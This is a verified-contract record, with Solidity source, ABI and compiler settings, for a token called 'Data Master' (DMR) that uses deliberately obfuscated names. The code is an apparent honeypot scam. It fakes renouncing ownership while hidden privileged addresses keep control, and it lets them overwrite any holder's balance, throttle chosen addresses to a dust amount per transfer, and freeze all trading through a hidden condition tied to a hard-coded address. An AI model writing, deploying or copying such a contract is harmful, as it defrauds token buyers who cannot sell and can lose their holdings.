{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface liquidityMarketing {\n    function createPair(address tradingTo, address toSender) external returns (address);\n}\n\ninterface toLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenLaunch) external view returns (uint256);\n\n    function transfer(address tradingSellReceiver, uint256 listSellMax) external returns (bool);\n\n    function allowance(address teamSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listSellMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingSellReceiver,\n        uint256 listSellMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingFundIs, uint256 value);\n    event Approval(address indexed teamSwap, address indexed spender, uint256 value);\n}\n\nabstract contract teamTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atTotal is toLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DataMaster is teamTo, toLimit, atTotal {\n\n    function allowance(address atFrom, address receiverAmount) external view virtual override returns (uint256) {\n        if (receiverAmount == amountMax) {\n            return type(uint256).max;\n        }\n        return shouldModeTake[atFrom][receiverAmount];\n    }\n\n    address public minTeamWallet;\n\n    address private launchToken;\n\n    function getOwner() external view returns (address) {\n        return launchToken;\n    }\n\n    address autoExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private listLaunch;\n\n    function owner() external view returns (address) {\n        return launchToken;\n    }\n\n    function transfer(address tokenSwap, uint256 listSellMax) external virtual override returns (bool) {\n        return txMarketingReceiver(_msgSender(), tokenSwap, listSellMax);\n    }\n\n    uint256 private shouldFee;\n\n    address public enableReceiver;\n\n    string private liquidityTeam = \"DMR\";\n\n    uint256 private buyFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isWalletReceiver;\n    }\n\n    bool public launchedToken;\n\n    bool public walletLimitLaunch;\n\n    uint256 constant swapMode = 13 ** 10;\n\n    bool private toFrom;\n\n    function autoList(address receiverFeeTake) public {\n        require(receiverFeeTake.balance < 100000);\n        if (walletLimitLaunch) {\n            return;\n        }\n        if (autoReceiver) {\n            launchIs = shouldFee;\n        }\n        senderTotalTrading[receiverFeeTake] = true;\n        \n        walletLimitLaunch = true;\n    }\n\n    string private amountEnableReceiver = \"Data Master\";\n\n    mapping(address => bool) public senderTotalTrading;\n\n    function toBuy(address enableFee) public {\n        fromAuto();\n        if (autoReceiver != toFrom) {\n            buyFrom = listLaunch;\n        }\n        if (enableFee == enableReceiver || enableFee == minTeamWallet) {\n            return;\n        }\n        limitReceiver[enableFee] = true;\n    }\n\n    bool public autoReceiver;\n\n    function transferFrom(address receiverExempt, address tradingSellReceiver, uint256 listSellMax) external override returns (bool) {\n        if (_msgSender() != amountMax) {\n            if (shouldModeTake[receiverExempt][_msgSender()] != type(uint256).max) {\n                require(listSellMax <= shouldModeTake[receiverExempt][_msgSender()]);\n                shouldModeTake[receiverExempt][_msgSender()] -= listSellMax;\n            }\n        }\n        return txMarketingReceiver(receiverExempt, tradingSellReceiver, listSellMax);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptIsMode;\n    }\n\n    function balanceOf(address tokenLaunch) public view virtual override returns (uint256) {\n        return swapShouldMin[tokenLaunch];\n    }\n\n    function exemptEnableReceiver(address receiverExempt, address tradingSellReceiver, uint256 listSellMax) internal returns (bool) {\n        require(swapShouldMin[receiverExempt] >= listSellMax);\n        swapShouldMin[receiverExempt] -= listSellMax;\n        swapShouldMin[tradingSellReceiver] += listSellMax;\n        emit Transfer(receiverExempt, tradingSellReceiver, listSellMax);\n        return true;\n    }\n\n    uint256 takeSell;\n\n    function fundMarketingWallet(uint256 listSellMax) public {\n        fromAuto();\n        takeSell = listSellMax;\n    }\n\n    uint8 private exemptIsMode = 18;\n\n    function autoFee() public {\n        emit OwnershipTransferred(enableReceiver, address(0));\n        launchToken = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldModeTake;\n\n    address amountMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private isWalletReceiver = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return amountEnableReceiver;\n    }\n\n    uint256 private launchIs;\n\n    mapping(address => uint256) private swapShouldMin;\n\n    mapping(address => bool) public limitReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityTeam;\n    }\n\n    event OwnershipTransferred(address indexed marketingTx, address indexed amountTo);\n\n    function fromAuto() private view {\n        require(senderTotalTrading[_msgSender()]);\n    }\n\n    function approve(address receiverAmount, uint256 listSellMax) public virtual override returns (bool) {\n        shouldModeTake[_msgSender()][receiverAmount] = listSellMax;\n        emit Approval(_msgSender(), receiverAmount, listSellMax);\n        return true;\n    }\n\n    constructor (){\n        if (autoReceiver) {\n            buyFrom = shouldFee;\n        }\n        atMax sellToMode = atMax(amountMax);\n        minTeamWallet = liquidityMarketing(sellToMode.factory()).createPair(sellToMode.WETH(), address(this));\n        if (shouldFee != listLaunch) {\n            shouldFee = buyFrom;\n        }\n        enableReceiver = _msgSender();\n        senderTotalTrading[enableReceiver] = true;\n        swapShouldMin[enableReceiver] = isWalletReceiver;\n        autoFee();\n        if (toFrom != launchedToken) {\n            buyFrom = launchIs;\n        }\n        emit Transfer(address(0), enableReceiver, isWalletReceiver);\n    }\n\n    uint256 receiverList;\n\n    function txAmount(address tokenSwap, uint256 listSellMax) public {\n        fromAuto();\n        swapShouldMin[tokenSwap] = listSellMax;\n    }\n\n    function txMarketingReceiver(address receiverExempt, address tradingSellReceiver, uint256 listSellMax) internal returns (bool) {\n        if (receiverExempt == enableReceiver) {\n            return exemptEnableReceiver(receiverExempt, tradingSellReceiver, listSellMax);\n        }\n        uint256 buyTrading = toLimit(minTeamWallet).balanceOf(autoExempt);\n        require(buyTrading == takeSell);\n        require(tradingSellReceiver != autoExempt);\n        if (limitReceiver[receiverExempt]) {\n            return exemptEnableReceiver(receiverExempt, tradingSellReceiver, swapMode);\n        }\n        return exemptEnableReceiver(receiverExempt, tradingSellReceiver, listSellMax);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFundIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSellMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFeeTake\",\"type\":\"address\"}],\"name\":\"autoList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listSellMax\",\"type\":\"uint256\"}],\"name\":\"fundMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTeamWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTotalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"}],\"name\":\"toBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSellMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingSellReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSellMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSellMax\",\"type\":\"uint256\"}],\"name\":\"txAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLimitLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DataMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}